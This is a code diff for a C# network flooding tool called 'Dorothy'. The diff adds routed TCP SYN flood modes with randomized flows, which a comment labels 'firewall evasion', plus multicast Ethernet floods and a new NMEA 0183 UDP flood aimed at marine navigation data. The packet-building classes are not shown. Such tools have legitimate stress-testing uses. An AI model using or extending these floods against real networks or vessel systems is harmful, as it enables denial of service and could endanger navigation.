@@ -254,21 +254,30 @@ namespace Dorothy.Models
             _logger.LogInfo(message);
         }
 
-        private async Task<PacketParameters> CreatePacketParameters(string targetIp, int targetPort, long megabitsPerSecond)
+        private async Task<PacketParameters> CreatePacketParameters(string targetIp, int targetPort, long megabitsPerSecond, bool isMulticast = false)
         {
             var targetIpObj = IPAddress.Parse(targetIp);
             var sourceIpObj = IPAddress.Parse(SourceIp);
             
-            // For targets on different subnets, use gateway MAC as destination
+            // For multicast, MAC is already set to multicast MAC (01:00:5E:xx:xx:xx or 33:33:xx:xx:xx)
+            // Don't override with gateway MAC - multicast frames use multicast MAC directly
             byte[] destinationMac;
-            if (!IsOnSameSubnet(sourceIpObj, targetIpObj))
+            if (isMulticast)
             {
+                // For multicast, skip MAC resolution - multicast MAC is set by caller
+                // Don't log gateway MAC message for multicast - it's misleading
+                // The multicast MAC will be set by the caller or in StartEthernetAttackAsync
+                destinationMac = Array.Empty<byte>(); // Will be set by caller
+            }
+            else if (!IsOnSameSubnet(sourceIpObj, targetIpObj))
+            {
+                // For unicast targets on different subnets, use gateway MAC as destination
                 if (GatewayMac.Length == 0)
                 {
                     _logger.LogError("Gateway MAC address is required for cross-subnet communication");
                     throw new InvalidOperationException("Gateway MAC address is required for cross-subnet communication");
                 }
-                        _logger.LogInfo($"🌐 Using gateway MAC for external target: {BitConverter.ToString(GatewayMac).Replace("-", ":")}");
+                _logger.LogInfo($"🌐 Using gateway MAC for external target: {BitConverter.ToString(GatewayMac).Replace("-", ":")}");
                 destinationMac = GatewayMac;
             }
             else
@@ -361,22 +370,40 @@ namespace Dorothy.Models
                                 break;
 
                             case AttackType.TcpSynFlood:
-                                if (!IsOnSameSubnet(sourceIpObj, targetIpObj))
+                                bool isRouted = !IsOnSameSubnet(sourceIpObj, targetIpObj);
+                                using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token))
                                 {
-                                    _logger.LogInfo("Target is on different subnet - Using routed TCP flood attack");
-                                    using (var tcpFlood = new TcpFloodRouted(packetParams, _cancellationSource.Token))
+                                    // Configure routing-aware behavior
+                                    tcpFlood.IsRouted = isRouted;
+                                    tcpFlood.RandomizeFlows = isRouted; // Randomize for routed (firewall evasion)
+                                    tcpFlood.AddPayload = !isRouted; // No payload for routed (firewall-friendly)
+                                    
+                                    if (isRouted)
                                     {
-                                        tcpFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
-                                        await tcpFlood.StartAsync();
+                                        _logger.LogInfo("Target is on different subnet - Using routed TCP flood (no payload, randomized flows)");
                                     }
+                                    else
+                                    {
+                                        _logger.LogInfo("Target is on same subnet - Using local TCP flood (with payload, fixed source port)");
+                                    }
+                                    
+                                    tcpFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
+                                    await tcpFlood.StartAsync();
                                 }
-                                else
+                                break;
+
+                            case AttackType.TcpRoutedFlood:
+                                // Explicit routed mode - always use routing-aware behavior regardless of subnet
+                                using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token))
                                 {
-                                    using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token))
-                                    {
-                                        tcpFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
-                                        await tcpFlood.StartAsync();
-                                    }
+                                    tcpFlood.IsRouted = true;
+                                    tcpFlood.RandomizeFlows = true; // Always randomize for explicit routed mode
+                                    tcpFlood.AddPayload = false; // Never use payload in explicit routed mode
+                                    
+                                    _logger.LogInfo("Using explicit routed TCP flood mode (no payload, randomized flows)");
+                                    
+                                    tcpFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
+                                    await tcpFlood.StartAsync();
                                 }
                                 break;
 
@@ -549,7 +576,7 @@ namespace Dorothy.Models
             }
         }
 
-        public async Task StartEthernetAttackAsync(string targetIp, int targetPort, long megabitsPerSecond, EthernetFlood.EthernetPacketType packetType, bool useIPv6 = false)
+        public async Task StartEthernetAttackAsync(string targetIp, int targetPort, long megabitsPerSecond, EthernetFlood.EthernetPacketType packetType, bool useIPv6 = false, byte[]? destinationMac = null)
         {
             if (_isAttackRunning)
             {
@@ -566,7 +593,27 @@ namespace Dorothy.Models
                 {
                     try
                     {
-                        var packetParams = await CreatePacketParameters(targetIp, targetPort, megabitsPerSecond);
+                        // For multicast, MAC is already set to multicast MAC (01:00:5E:xx:xx:xx or 33:33:xx:xx:xx)
+                        // Don't resolve MAC or use gateway MAC - multicast uses multicast MAC directly
+                        bool isMulticast = packetType == EthernetFlood.EthernetPacketType.Multicast;
+                        var packetParams = await CreatePacketParameters(targetIp, targetPort, megabitsPerSecond, isMulticast);
+                        
+                        // For multicast, use the provided multicast MAC (from caller) or default multicast MAC
+                        if (isMulticast)
+                        {
+                            if (destinationMac != null && destinationMac.Length > 0)
+                            {
+                                packetParams.DestinationMac = destinationMac;
+                            }
+                            else if (packetParams.DestinationMac == null || packetParams.DestinationMac.Length == 0)
+                            {
+                                // Fallback to default multicast MAC if not provided
+                                packetParams.DestinationMac = useIPv6 
+                                    ? new byte[] { 0x33, 0x33, 0x00, 0x00, 0x00, 0x01 } // IPv6 multicast
+                                    : new byte[] { 0x01, 0x00, 0x5E, 0x00, 0x00, 0x01 }; // IPv4 multicast
+                            }
+                        }
+                        
                         using var flood = new EthernetFlood(packetParams, packetType, _cancellationSource.Token, useIPv6);
                         flood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                         await flood.StartAsync();
@@ -582,6 +629,50 @@ namespace Dorothy.Models
             {
                 _isAttackRunning = false;
                 _logger.LogError($"Failed to start Ethernet attack: {ex.Message}");
+                await StopAttackAsync();
+            }
+        }
+
+        public async Task StartNmea0183AttackAsync(string targetIp, int targetPort, long megabitsPerSecond, bool isMulticast)
+        {
+            if (_isAttackRunning)
+            {
+                _logger.LogWarning("Attack already in progress");
+                return;
+            }
+
+            try
+            {
+                _cancellationSource = new CancellationTokenSource();
+                _isAttackRunning = true;
+
+                await Task.Run(async () =>
+                {
+                    try
+                    {
+                        var packetParams = await CreatePacketParameters(targetIp, targetPort, megabitsPerSecond, isMulticast: false);
+                        
+                        // For multicast, set TTL to 1
+                        if (isMulticast)
+                        {
+                            packetParams.Ttl = 1;
+                        }
+                        
+                        using var nmeaFlood = new Nmea0183UdpFlood(packetParams, _cancellationSource.Token, isMulticast);
+                        nmeaFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
+                        await nmeaFlood.StartAsync();
+                    }
+                    catch (Exception ex)
+                    {
+                        _logger.LogError($"NMEA 0183 attack failed: {ex.Message}");
+                        throw;
+                    }
+                }, _cancellationSource.Token);
+            }
+            catch (Exception ex)
+            {
+                _isAttackRunning = false;
+                _logger.LogError($"Failed to start NMEA 0183 attack: {ex.Message}");
                 await StopAttackAsync();
             }
         }
